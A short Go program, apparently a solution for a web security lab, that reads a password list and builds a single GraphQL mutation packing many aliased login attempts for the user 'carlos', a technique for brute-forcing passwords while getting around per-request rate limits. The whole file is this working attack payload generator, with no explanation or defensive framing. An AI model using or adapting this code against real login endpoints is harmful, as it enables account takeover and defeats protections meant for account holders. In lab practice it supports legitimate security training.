package main

import (
	"bufio"
	"fmt"
	"log"
	"os"
	"strings"
)

var passwords = []string{}

func main() {
	intial := `{"query": "mutation{`
	between := `login%d:login(input:{username:\"carlos\", password:\"%s\"}){token\n success}\n`
	final := `}"}`

	file, err := os.Open("./passwords.txt")
	if err != nil {
		log.Fatal("while opening password file", err)
	}

	scanner := bufio.NewScanner(file)

	grapqhlQuery := intial
	i := 0
	for scanner.Scan() {
		password := scanner.Text()
		password = strings.ReplaceAll(password, "\n", "")
		local := fmt.Sprintf(between, i, password)
		grapqhlQuery = grapqhlQuery + local
		i++
	}

	grapqhlQuery = grapqhlQuery + final

	fmt.Println("final query", grapqhlQuery)
}
